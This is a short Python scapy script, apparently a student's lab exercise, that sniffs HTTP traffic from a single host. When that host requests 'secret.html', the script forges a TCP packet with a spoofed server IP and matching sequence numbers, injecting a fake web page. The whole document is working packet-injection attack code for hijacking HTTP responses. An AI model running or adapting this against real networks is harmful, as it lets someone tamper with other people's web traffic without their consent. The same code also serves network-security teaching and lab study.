from scapy.all import *

data = '''HTTP/1.1 200 OK\r
Server: nginx/1.14.0 (Ubuntu)\r
Content-Type: text/html\r
Content-Length: 43\r
\r\n
<html>
<p>attack by 2017011313</p>
</html>
'''


def attack(req):
    if 'secret.html' not in str(req):
        return
    resp = IP() / TCP() / data
    resp[TCP].dport = req[TCP].sport
    resp[TCP].sport = req[TCP].dport
    resp[TCP].seq = req[TCP].ack
    resp[TCP].ack = req[TCP].seq + len(req[TCP].load)
    resp[TCP].flags = 'AP'
    resp[IP].src = req[IP].dst
    resp[IP].dst = req[IP].src
    send(resp, verbose=1, count=1)


sniff(prn=attack, filter='tcp and tcp port 80 and ip src 10.0.3.42', store=0)
